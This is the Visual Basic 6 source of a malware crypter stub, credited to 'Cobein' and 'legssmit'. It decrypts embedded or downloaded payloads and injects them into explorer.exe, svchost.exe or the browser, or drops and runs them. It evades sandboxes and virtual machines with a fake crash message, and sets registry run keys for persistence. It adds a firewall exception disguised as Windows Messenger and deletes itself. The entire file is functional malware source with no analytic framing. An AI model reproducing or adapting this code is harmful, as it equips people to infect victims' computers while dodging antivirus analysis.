Attribute VB_Name = "mMain"
'Crypter based off Cobeins Cryptosy
'Edited by legssmit
' Use  : At your own risk
' ' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission FROM COBEIN AND ME (Legssmit).

Option Explicit
'
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
    
Private Declare Function RegCreateKeyEx& Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey&, ByVal lpSubKey$, ByVal Reserved&, ByVal lpClass$, ByVal dwOptions&, ByVal samDesired&, lpSecurityAttributes As SECURITY_ATTRIBUTES, phkResult&, lpdwDisposition&)
Private Declare Function RegSetValueEx& Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey&, ByVal lpszValueName$, ByVal dwRes&, ByVal dwType&, lpDataBuff As Any, ByVal nSize&)
Private Declare Function RegCloseKey& Lib "advapi32.dll" (ByVal hKey&)
Private Declare Function FindResource Lib "kernel32" Alias "FindResourceA" (ByVal hInstance As Long, ByVal lpName As String, ByVal lpType As String) As Long
Private Declare Function LoadResource Lib "kernel32" (ByVal hInstance As Long, ByVal hResInfo As Long) As Long
Private Declare Function LockResource Lib "kernel32" (ByVal hResData As Long) As Long
Private Declare Function SizeofResource Lib "kernel32" (ByVal hInstance As Long, ByVal hResInfo As Long) As Long
Private Declare Function FreeResource Lib "kernel32" (ByVal hResData As Long) As Long
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Dim hMod As Long, hRes As Long, hLoad As Long, hLock As Long, lSize As Long, sBuff As String

Type SECURITY_ATTRIBUTES
        nLength As Long
        lpSecurityDescriptor As Long
        bInheritHandle As Long
End Type

Const KEY_SET_VALUE = &H2&
Const KEY_CREATE_SUB_KEY = &H4&
Const REG_SZ = 1&
Const READ_CONTROL = &H20000
Const STANDARD_RIGHTS_WRITE = READ_CONTROL
Const Key_Write = STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long

Private Const MAX_PATH As Long = 260
Private Const ERROR_FILE_NO_ASSOCIATION As Long = 31
Private Const ERROR_FILE_NOT_FOUND As Long = 2
Private Const ERROR_PATH_NOT_FOUND As Long = 3
Private Const ERROR_FILE_SUCCESS As Long = 32 'my constant
Private Const ERROR_BAD_FORMAT As Long = 11

Const DATA_START = "[DATTTA]"
Const DATA_ARRAY = "[12#21]"
Dim AntiSandBoxie As String
Dim AntiAnubis As String
Dim AntiJoeBox As String
Dim AntiCWSandBox As String
Dim AntiThreatExpert As String
Dim AntiVMware As String
Dim AntiVirtualPC As String
Dim AntiVirtualBox As String
Dim EncryptionKey As String
Dim DelayInSecs As String
Dim MsgMessage As String
Dim MsgOptions As String
Dim MsgCaption As String
Dim InjectionPath As String
Dim MeltStub As String
Dim Apploc As String
Dim DropAs As String
Dim ProcToKill As String
Dim OrgFile() As String
Dim OrgFile1() As String
Dim EOF() As String
Dim Extension() As String
Dim Inject() As String
Dim RegKeyForReboot(1000) As String
Dim RegKeyForStartup(1000) As String
Dim MemExec As String
Dim DropTo As String
Dim AreDelays(1000) As Integer
Dim SecsPerFile(1000) As Long
Dim SourceOfFile(1000) As String
Dim RegKeys() As String
Dim FWBypass As String

Public IsInSandboxes As String

Const StubSplit = "tzidtzitzitzuzutz5678567zrtu"
Const FileSplit = "4tz89gw34tvw348th0bht09wehtv"
Const EndSplit = "i0i4jvh230t9h34w890th4t9he90ht"
Const EOFSplit = "5zeh7j4w7a56a35675zh65h697r9hr7"
Const InjecSplit = "79k689je57hs4h67h6h796767h9"
Const StartupSplit = "6rj89j909e578j4wj6e8865ke88l"
Const RegKeySplit = "e78el977697584s678l96ö896dr97l9"
Const DelaySplit = "r679sr75mk8t78567fmjdukt878675856856"

Dim Files As String
Dim sFile() As String
Dim sStub() As String
Dim Delay() As String
Dim Delay1() As String
Dim i As Integer
Dim x As Integer
Dim y As Integer
Dim Buffer As Integer
Dim lowest(1000) As Long
Dim IsDone(1000) As Integer
Dim CheckThisFile As Integer
Dim Try As Integer
Dim InTemp As String

Private Const INTERNET_OPEN_TYPE_DIRECT = 1
Private Const INTERNET_OPEN_TYPE_PROXY = 3
Private Const INTERNET_FLAG_RELOAD = &H80000000
Private Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetCloseHandle Lib "wininet" (ByVal hInet As Long) As Integer
Private Declare Function InternetReadFile Lib "wininet" (ByVal hFile As Long, sBuffer As Any, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Private Declare Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszURL As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
Dim b1() As Byte
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private m_bCancel As Boolean
Dim clsCrypt  As New clsCrypt
Dim URL As String
Private Function DownloadFileToMemory(lpszURL As String) As Byte()
Dim b1() As Byte, b2(0 To 999) As Byte
Dim hOpen As Long
Dim hFile As Long
Dim sBuffer As String
Dim lpRet As Long, lpTotalRead As Long, lpCurrent As Long
    sBuffer = Space(1000)
    hOpen = InternetOpen("mdDLMemEx", INTERNET_OPEN_TYPE_DIRECT, vbNullString, vbNullString, 0)
    hFile = InternetOpenUrl(hOpen, lpszURL, vbNullString, ByVal 0&, INTERNET_FLAG_RELOAD, ByVal 0&)
    lpRet = 1
    lpTotalRead = 1
    Do
        lpCurrent = lpTotalRead - 1
        InternetReadFile hFile, b2(0), 1000, lpRet
        If lpRet = 0 Then Exit Do
        lpTotalRead = lpTotalRead + lpRet
        ReDim Preserve b1(0 To lpTotalRead - 1) As Byte
        CopyMemory b1(lpCurrent), b2(0), lpRet
    DoEvents
    Loop
    InternetCloseHandle hFile
    InternetCloseHandle hOpen
    DownloadFileToMemory = b1
End Function
Public Function XORDecryption(CodeKey As String, DataIn As String) As String
    
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim intXOrValue1 As Integer
    Dim intXOrValue2 As Integer
    

    For lonDataPtr = 1 To (Len(DataIn) / 2)
        'The first value to be XOr-ed comes from the data to be encrypted
        intXOrValue1 = Val("&H" & (Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))
        'The second value comes from the code key
        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        
        strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
    Next lonDataPtr
   XORDecryption = strDataOut
End Function
Private Sub Error_Message()
MsgBox "Fatal application error : The instruction at 0x77f51d26 referenced memory at 0.007f4f2c. The memory could not be read.", vbCritical, "Microsoft Windows"
End Sub

Public Function Tegen()
If AntiAnubis = 1 And IsAnubis = True Then
    Call Error_Message
    End
Else

End If
If AntiThreatExpert = 1 And IsInSandboxes = 2 Then
    Call Error_Message
    End
Else

End If

If AntiCWSandBox = 1 And IsInSandboxes = 4 Then
    Call Error_Message
    End
End If

If AntiJoeBox = 1 And IsInSandboxes = 5 Then
    Call Error_Message
    End
End If

If AntiVMware = 1 And IsVirtualPCPresent = 1 Then
    Call Error_Message
    End
End If

If AntiVirtualPC = 1 And IsVirtualPCPresent = 2 Then
    Call Error_Message
    End
End If

If AntiVirtualBox = 1 And IsVirtualPCPresent = 3 Then
    Call Error_Message
    End
End If

End Function

Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long)
    
    Dim sdata   As String

    If Not m_bCancel Then
If SourceOfFile(i) = "HDD" Then
sdata = clsCrypt.DecryptString(OrgFile1(0), EncryptionKey)
If Extension(1) = "exe" And MemExec = 1 Then mPEL.InjectEXE InjectionPath, StrConv(sdata, vbFromUnicode)
If MemExec = 0 Then
 If DropTo <> "System32" Then Open Environ(DropTo) & "\file" & i & "." & Extension(1) For Binary As #1
 If DropTo = "System32" Then Open Environ("windir") & "\system32\file" & i & "." & Extension(1) For Binary As #1
Put #1, , sdata
Close #1
If RegKeyForStartup(i) = "False" And RegKeyForReboot(i) = "False" Then
If DropTo <> "System32" Then Call CallApiByName("shell32", "ShellExecuteW", 0&, 0&, StrPtr(Environ(DropTo) & "\file" & i & "." & Extension(1)), 0&, 0&, vbNormalFocus)
If DropTo = "System32" Then Call CallApiByName("shell32", "ShellExecuteW", 0&, 0&, StrPtr(Environ("windir") & "\system32\file" & i & "." & Extension(1)), 0&, 0&, vbNormalFocus)
End If
End If
End If
If SourceOfFile(i) = "Internet" Then
    URL = clsCrypt.DecryptString(OrgFile1(0), EncryptionKey)
    Sleep (25)
    
    If MemExec = 1 Then
    b1 = DownloadFileToMemory(URL)
    Call mPEL.InjectEXE(ThisExe, b1)
    End If
    
    If MemExec = 0 Then
    If RegKeyForStartup(i) = "False" And RegKeyForReboot(i) = "False" Then
        If DropTo <> "System32" Then Call CallApiByName("urlmon", "URLDownloadToFileW", 0, StrPtr(URL), StrPtr(Environ(DropTo) & "\file" & i & "." & Extension(1)), 0, 0)
        If DropTo = "System32" Then Call CallApiByName("urlmon", "URLDownloadToFileW", 0, StrPtr(URL), StrPtr(Environ("windir") & "\system32\file" & i & "." & Extension(1)), 0, 0)
        If DropTo <> "System32" Then Call CallApiByName("shell32", "ShellExecuteW", 0&, 0&, StrPtr(Environ(DropTo) & "\file" & i & "." & Extension(1)), 0&, 0&, vbNormalFocus)
        If DropTo = "System32" Then Call CallApiByName("shell32", "ShellExecuteW", 0&, 0&, StrPtr(Environ("windir") & "\system32\file" & i & "." & Extension(1)), 0&, 0&, vbNormalFocus)
    End If
End If
End If
 
m_bCancel = True
End If

End Sub

Private Function ReadSettings()
Dim DATA_SPLIT() As String
Dim DATA_PARAMS() As String
Dim GRAB_DATA As String

Open ThisExe For Binary As #1
GRAB_DATA = String(LOF(1), vbNullChar)
Get #1, , GRAB_DATA
Close #1
DATA_SPLIT() = Split(GRAB_DATA, DATA_START)
DATA_PARAMS = Split(DATA_SPLIT(1), DATA_ARRAY)
AntiSandBoxie = DATA_PARAMS(0)
AntiAnubis = DATA_PARAMS(1)
AntiThreatExpert = DATA_PARAMS(2)
AntiCWSandBox = DATA_PARAMS(3)
AntiJoeBox = DATA_PARAMS(4)
AntiVMware = DATA_PARAMS(5)
AntiVirtualPC = DATA_PARAMS(6)
AntiVirtualBox = DATA_PARAMS(7)
EncryptionKey = DATA_PARAMS(8)
FWBypass = DATA_PARAMS(9)
MsgOptions = DATA_PARAMS(11)
MsgMessage = DATA_PARAMS(12)
MsgCaption = DATA_PARAMS(13)
MeltStub = DATA_PARAMS(14)
DropAs = DATA_PARAMS(15)
ProcToKill = DATA_PARAMS(16)
End Function

Private Function SetVariables()
    AntiAnubis = 1
    AntiJoeBox = 1
    AntiSandBoxie = 0
    AntiCWSandBox = 1
    AntiThreatExpert = 1
    AntiVMware = 1
    AntiVirtualPC = 1
    AntiVirtualBox = 1
    EncryptionKey = 1
    DelayInSecs = 0
    IsInSandboxes = 0
    InjectionPath = 0
    MeltStub = 0
    DropAs = "673353.tmp"
    ProcToKill = ""
    MemExec = 1
    FWBypass = 0
    InTemp = 1
    End Function
Private Sub Main()
     
    Call SetVariables
    Call ReadSettings
     
    If App.Path <> Environ("Tmp") Then
    InTemp = 0
    Call CheckAntis
    Call Tegen
    End If
     
    KillProcess ProcToKill
    If MeltStub = 1 Then Call VerbrandMezelf
    If MsgMessage <> "" Then
    MsgBox MsgMessage, MsgOptions, MsgCaption
    End If
     
If FWBypass = 1 Then FirewallException (ThisExe)

hMod = GetModuleHandle(vbNullString) 'get the handle of the file

hRes = FindResource(hMod, 461, "2676") 'find the resource we have added under CUSTOM 101.
hLoad = LoadResource(hMod, hRes) 'load the resource we have just searched
hLock = LockResource(hLoad) 'I dont exactly know what lockresource does: MSDN says "Locks the specified resource in memory." So I think it just remembers the resource ? xD
lSize = SizeofResource(hMod, hRes) 'check what the filesize of the loaded resource is
 
sBuff = Space(lSize)

Call CopyMemory(ByVal sBuff, ByVal hLock, lSize) 'this is where it all happens: hLock (the resource loaded in the memory) gets copied to the sBuff string
Call FreeResource(hLoad) 'unload the resource
 
sFile = Split(sBuff, EndSplit)
For i = 1 To UBound(sFile())
Call SplitInParts
lowest(i) = SecsPerFile(i)
For x = 1 To UBound(sFile())
        If lowest(i) < lowest(x) Then  '[if current array is smaller and not 0]
        Buffer = lowest(i)                        '[Copy current array to buffer]
        lowest(i) = lowest(x)               '[switch array numbers     i = x]
        lowest(x) = Buffer                        '[switch arrays numbers  x = i]
        End If
Next x
Next i
Try = 0
 
Do Until CheckThisFile = UBound(sFile())
Try = Try + 1
For i = 1 To UBound(sFile())
    If IsDone(i) = 0 Then
    MemExec = 1
    m_bCancel = False
    Call SplitInParts
        If lowest(1) = SecsPerFile(i) Then
        Call LaunchFile
         
        For x = 1 To UBound(sFile())
        lowest(x) = lowest(x + 1)
        Next x
        End If
    End If
Next i
Sleep (50)
Loop
End Sub

Private Function CheckAntis()
Call IsAnubis
Call IsInSandbox
Call IsVirtualPCPresent
End Function
Public Function GetBrowser() As String
   Dim flag As Long
   GetBrowser = GetBrowserName(flag)
End Function
Private Function ReArrangeSecs()
    For x = 1 To UBound(sFile())
    If SecsPerFile(i) > SecsPerFile(x) Then
    SecsPerFile(i) = SecsPerFile(i) - SecsPerFile(x)
    End If
    Next x
End Function
Private Function GetBrowserName(dwFlagReturned As Long) As String
   Dim hFile As Long
   Dim sResult As String
   Dim sTempFolder As String
   sTempFolder = DirTemp()
   hFile = FreeFile
      Open sTempFolder & "dummy.html" For Output As #hFile
   Close #hFile
   sResult = Space$(MAX_PATH)
   dwFlagReturned = CallApiByName("shell32", "FindExecutableW", StrPtr("dummy.html"), StrPtr(sTempFolder), StrPtr(sResult))
   Kill sTempFolder & "dummy.html"
   GetBrowserName = TrimNull(sResult)

End Function
Sub SetRegKey(H_KEY&, RSubKey$, ValueName$, RegValue$)
    'H_KEY must be one of the Key Constants
    Dim lRtn&         'returned by registry functions, should be 0&
    Dim hKey&         'return handle to opened key
    Dim lpDisp&
    Dim Sec_Att As SECURITY_ATTRIBUTES
    Sec_Att.nLength = 12&
    Sec_Att.lpSecurityDescriptor = 0&
    Sec_Att.bInheritHandle = False
    If RegValue = "" Then RegValue = " "
    
        lRtn = RegCreateKeyEx(H_KEY, RSubKey, 0&, "", 0&, Key_Write, Sec_Att, hKey, lpDisp)
        If lRtn <> 0 Then
            Exit Sub       'No key open, so leave
        End If
        lRtn = RegSetValueEx(hKey, ValueName, 0&, REG_SZ, ByVal RegValue, CLng(Len(RegValue) + 1))
        lRtn = RegCloseKey(hKey)
End Sub
Private Function TrimNull(item As String)

    Dim pos As Integer

    pos = InStr(item, Chr$(0))

    If pos Then
       TrimNull = Left$(item, pos - 1)
    Else
       TrimNull = item
    End If

End Function
Public Function VerbrandMezelf()
Dim sYourCommand As String
Dim TempPath As String

TempPath = DirTemp

If InTemp = 0 Then
Call CopyFile(ThisExe, Environ("Temp") & "\" & DropAs, False)
Apploc = ThisExe
Call CallApiByName("shell32", "ShellExecuteW", 0&, 0&, StrPtr("cmd.exe"), StrPtr("/k" & Environ("Temp") & "\" & DropAs & " " & Apploc), 0&, vbHide)
End
End If

If InTemp = 1 Then
If Command$ <> "" Then
Apploc = Command$
KillProcess "cmd.exe"
For i = 1 To 1000
i = i + 1
Next i
sYourCommand = "Del " & Chr(34) & Apploc & Chr(34)
Call CallApiByName("shell32", "ShellExecuteW", 0&, 0&, StrPtr("cmd.exe"), StrPtr("/c" & sYourCommand), 0&, vbHide)
End If
End If
End Function
Function CopyFile(src As String, dest As String, Optional FailIfDestExists As Boolean) As Boolean
Dim lRet As Long
    lRet = CallApiByName("kernel32", "CopyFileW", StrPtr(src), StrPtr(dest), VarPtr(FailIfDestExists))
    CopyFile = (lRet > 0)
End Function
Private Function LaunchFile()
   If IsDone(i) = 1 Then Exit Function
      
    If i = 1 And Try = 1 Then Sleep (SecsPerFile(i))
    If i <> 1 And SecsPerFile(i) <> 0 Or Try >= 2 Then
    Call ReArrangeSecs
    Sleep (SecsPerFile(i))
    End If
    If Inject(0) = "Inject into ThisExe" Then InjectionPath = ThisExe
    If Inject(0) = "Inject into explorer.exe" Then InjectionPath = (Environ("WinDir") & "\explorer.exe")
    If Inject(0) = "Inject into svchost.exe" Then InjectionPath = (Environ("WinDir") & "\system32\svchost.exe")
    If Inject(0) = "Inject into Default Browser" Then InjectionPath = GetBrowser

    If Inject(0) = "%TEMP%" Then
    MemExec = 0
    DropTo = "tmp"
    End If

    If Inject(0) = "%WINDOWS%" Then
    MemExec = 0
    DropTo = "windir"
    End If

    If Inject(0) = "%SYSTEM32%" Then
    MemExec = 0
    DropTo = "System32"
    End If
    
    If RegKeyForReboot(i) <> "False" Then
    If DropTo <> "System32" Then Call SetRegKey(&H80000002, clsCrypt.DecryptString("¬«J±1ŠP÷—êóÛ{ç½ËäSáMª&,o[Gÿ`H*êõÔÈï<‹íÖ$Ÿ[5«", "YEILJSLKJLKELKY"), RegKeyForReboot(i), Environ(DropTo) & "\file" & i & "." & Extension(1))
    If DropTo = "System32" Then Call SetRegKey(&H80000002, clsCrypt.DecryptString("¬«J±1ŠP÷—êóÛ{ç½ËäSáMª&,o[Gÿ`H*êõÔÈï<‹íÖ$Ÿ[5«", "YEILJSLKJLKELKY"), RegKeyForReboot(i), Environ("windir") & "\system32\file" & i & "." & Extension(1))
    End If

    If RegKeyForStartup(i) <> "False" Then
    If DropTo <> "System32" Then Call SetRegKey(&H80000002, clsCrypt.DecryptString("<óhV¥±Ë—*·ažùÁÉ±ß¼ïì5FM'ýû2A»`;ZšJ‚12|", "EIJOJG"), RegKeyForStartup(i), Environ(DropTo) & "\file" & i & "." & Extension(1))
    If DropTo = "System32" Then Call SetRegKey(&H80000002, clsCrypt.DecryptString("<óhV¥±Ë—*·ažùÁÉ±ß¼ïì5FM'ýû2A»`;ZšJ‚12|", "EIJOJG"), RegKeyForStartup(i), Environ("windir") & "\system32\file" & i & "." & Extension(1))
    End If
    Do Until m_bCancel = True
    Call TimerProc(0, Rnd * 1024, 100, AddressOf TimerProc)
    Call Sleep(100)
    Loop
    CheckThisFile = CheckThisFile + 1
    IsDone(i) = 1
End Function
    Public Sub FirewallException(Path As String)
    Shell "cmd /c REG ADD HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v ""DoNotAllowExceptions"" /t REG_DWORD /d ""0"" /f", vbHide
    Shell "cmd /c REG ADD HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List /v """ & Path & """ /t 1 /d """ & Path & ":*:Enabled:Windows Messenger"" /f", vbHide
    End Sub
Function DirTemp() As String
    Dim lLenTemp As Long
    Static ssTempDir As String

    If Len(ssTempDir) = 0 Then
        lLenTemp = 150
        ssTempDir = String$(lLenTemp, Chr$(0))
        'Get the username
        lLenTemp = GetTempPath(lLenTemp, ssTempDir)
        'strip the rest of the buffer
        ssTempDir = Left$(ssTempDir, lLenTemp)
        If Right$(ssTempDir, 1) <> "\" Then
            ssTempDir = ssTempDir & "\"
        End If
    End If
    DirTemp = ssTempDir
End Function
Private Function SplitInParts()
EOF() = Split(sFile(i - 1), EOFSplit)
OrgFile() = Split(sFile(i - 1), StubSplit)
OrgFile1() = Split(OrgFile(1), FileSplit)
Extension() = Split(EOF(0), DelaySplit)
Inject() = Split(Split(EOF(0), FileSplit)(1), InjecSplit)
Delay() = Split(Split(EOF(0), DelaySplit)(0), InjecSplit)
RegKeys() = Split(Split(EOF(1), RegKeySplit)(1), StartupSplit)

SourceOfFile(i) = Split(EOF(1), RegKeySplit)(0)

RegKeyForReboot(i) = RegKeys(0)
RegKeyForStartup(i) = RegKeys(1)
SecsPerFile(i) = Delay(1)
End Function


